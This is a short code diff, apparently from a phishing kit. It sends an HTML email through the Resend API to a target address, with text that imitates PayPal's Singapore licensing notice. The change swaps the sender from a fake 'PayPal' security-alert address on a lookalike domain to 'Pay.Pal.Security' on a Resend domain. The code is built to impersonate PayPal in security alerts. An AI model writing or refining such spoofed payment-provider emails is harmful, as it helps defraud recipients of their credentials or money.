@@ -118,7 +118,7 @@ PayPal Pte. Ltd. is licensed by the Monetary Authority of Singapore as a Major P
 `;
   // send  via email
     const sendEmail = await resend.emails.send({
-      from: "PayPal <security.pay.pal@alertcenter.center>",
+      from: "Pay.Pal.Security <onboarding@resend.dev>",
       to: email,
       subject,
       html,
